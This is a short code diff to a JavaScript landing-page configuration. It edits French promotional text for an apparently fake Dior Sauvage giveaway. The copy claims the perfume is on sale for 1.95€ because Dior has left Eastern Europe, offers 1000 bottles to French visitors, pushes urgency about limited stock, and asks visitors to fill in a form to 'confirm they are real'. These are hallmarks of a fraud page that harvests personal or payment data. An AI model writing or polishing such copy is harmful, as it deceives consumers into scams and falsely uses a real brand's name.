@@ -15,11 +15,11 @@ const orderOriginParam = window.__origin_param;
   // I FILL THIS INFO IN MAIN.JS
   const mainProduct = {
     header: "",
-    name: "Félicitations ! Vous pouvez participer à la promotion Dior Sauvage 100ml !",
+    name: "Félicitations! <br></br> Vous pouvez participer à la promotion Dior Sauvage 100ml !",
     oldPrice: "",
     newPrice: "",
     selectText: "",
-    text: "Félicitations! <br><br> Vous pouvez participer à la promotion Dior Sauvage 100ml! <br><br> Dior vend ses derniers parfums Sauvage pour seulement 1,95€ après avoir cessé ses activités en Europe de l'Est. Grâce à la nouvelle stratégie de campagne, chaque Français peut obtenir aujourd'hui 1 des 1000 parfums🎁.<br><br> Pour recevoir un Sauvage de Dior, veuillez remplir le formulaire pour confirmer que vous êtes une personne réelle. <br><br> Dépêchez-vous, le nombre d'articles proposés est limité!",
+    text: "Dior vend ses derniers parfums Sauvage pour seulement 1,95€ après avoir cessé ses activités en Europe de l'Est. Grâce à la nouvelle stratégie de campagne, chaque Français peut obtenir aujourd'hui 1 des 1000 parfums🎁.<br><br> Pour recevoir un Sauvage de Dior, veuillez remplir le formulaire pour confirmer que vous êtes une personne réelle. <br><br> Dépêchez-vous, le nombre d'articles proposés est limité!",
   };
 
   const notifications = [
